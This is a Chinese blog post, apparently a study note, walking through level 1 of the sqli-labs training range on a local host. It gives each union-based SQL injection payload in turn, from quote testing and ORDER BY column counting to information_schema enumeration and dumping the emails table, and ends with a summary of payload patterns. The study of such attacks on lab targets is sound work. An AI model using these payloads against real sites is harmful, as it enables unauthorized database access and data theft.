+++
date = "2019-08-20T15:56:26+08:00"
menu = "main"
categories = ["渗透学习笔记"]
tags = ["Sql-Lib靶场通关"]

banner = "banners/sqlmap_bg2.jpg"
title = "Sql-Lib第一关"
description = "Union注入"
images = []

+++

- 漏洞类型：GET型 - 基于报错 - 单引号 - 字符型注入
- 目标网址（本地靶场）：http://www.sqllib.com/less-1/?id=
- 目标：获取网站用户的邮箱

---

# ① 访问网址，测试是否存在SQL注入

## 正常访问

> http://www.sqllib.com/less-1/?id=1

**目前页面上在有两处显示信息**

- Your Login name：Dumb
- Your Password：Dumb

![正常访问](https://shop.io.mi-img.com/app/shop/img?id=shop_a26a65b1a5f6c9c9e58bea52a6ef23a9.jpeg)




## 异常测试

> ① http://www.sqllib.com/less-1/?id=1'
>
> ② http://www.sqllib.com/less-1/?id=1' and '1
>
> ... ...

![单引号测试](https://shop.io.mi-img.com/app/shop/img?id=shop_c3a9aef6acd3d846103f6df100f2d83f.jpeg)

![布尔测试](https://shop.io.mi-img.com/app/shop/img?id=shop_1e3aa4d02d04dc6958d5b75d0b2ad100.jpeg)

## 报错信息

**报错信息中，没有对我输入的单引号进行转义，传入的 id 参数有可能是字符型，后面注入时要尝试闭合单引号**

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1'



# ② 查询当前网页，使用的表名，包含的字段数量

## 输入 order by 1~99，直到页面显示异常

```
order by 3--+
```

![猜解字段数量](https://shop.io.mi-img.com/app/shop/img?id=shop_107592566ce5f543eaf8baf69c1a1c83.jpeg)

```
order by 4--+
```

![猜解字段数量_2](https://shop.io.mi-img.com/app/shop/img?id=shop_3cc11285380a40d3248f77d5f96906b2.jpeg)



# ③ 判断查询的信息，在页面显示的位置

```
union select 1,2,3
```

![判断信息回显位置](https://shop.io.mi-img.com/app/shop/img?id=shop_13dc1b06bf1362d4b74180b221c43ea3.jpeg)

#### **如图，最终确认，2，3是信息回显的位置，后面的语句中，"1" 最好替换为 "null"**<br>

#### **避免数据库出现异常。**


# ④ 查询数据库名、表名

```
union select null,database(),version()--+
```

![查询数据库、以及版本](https://shop.io.mi-img.com/app/shop/img?id=shop_30a9b12ff751baa6b8b5783c81524727.jpeg)



```
union select null,table_schema,table_name from information_schema.tables where table_schema='security' limit 0,1--+
```

![查询库中包含的表名](https://shop.io.mi-img.com/app/shop/img?id=shop_1ac99de1700468225c1e263a91fe3bc4.jpeg)

## **改变 limit m, n** 中的 m, 从表中一行行查询 0~99

![查询到users表](https://shop.io.mi-img.com/app/shop/img?id=shop_ef02ae9ffeb0aec4f05198a68b4b0d8d.jpeg)

# ⑤ 查询 "security" 库中的 "emails" 表所包含的字段名

```
union select null,table_name,column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1--+
```

![第一个字段](https://shop.io.mi-img.com/app/shop/img?id=shop_0fdca406df650b8055ffa6881da1e01f.jpeg)

![第二个字段](https://shop.io.mi-img.com/app/shop/img?id=shop_c262c1a882641a41430113d306dce9ed.jpeg)

# ⑥ 获取用户邮箱信息

```
union select null,id,email_id from security.emails limit 0,1--+
```

![查询用户邮箱](https://shop.io.mi-img.com/app/shop/img?id=shop_320a64aeb53beb4d897a85b35bf38ab5.jpeg)

![查询用户2](https://shop.io.mi-img.com/app/shop/img?id=shop_6ee464d11e87288a2f29dd7922fdd9fd.jpeg)

## 用户邮箱

- Dumb@dhakkan.com
- Angel@ilovenu.com

## 总结

首先，要判断出从 id 传入的参数，是字符串，还是数字(int)型

- 字符型要用 ' ，"，--+，#等注释，闭合单引号，或者注释对查询无用的 MySql 语句

  

```
id=' union select ... --+'
```

- 数字型可以用 "-" 符号，布尔表达式

  
```
id=-1 union select ...
id=1 and 1=2 union select ...
```

然后，通过常见的报错信息，可以大致判断注入的类型（看运气，实战大多盲注）

最后，手工输入需要耐心和细心，有时候注入的语句没有效果

很有可能是手误敲错字母，漏掉了单引号之类的... ...

有不足和错误之处，欢迎留言讨论~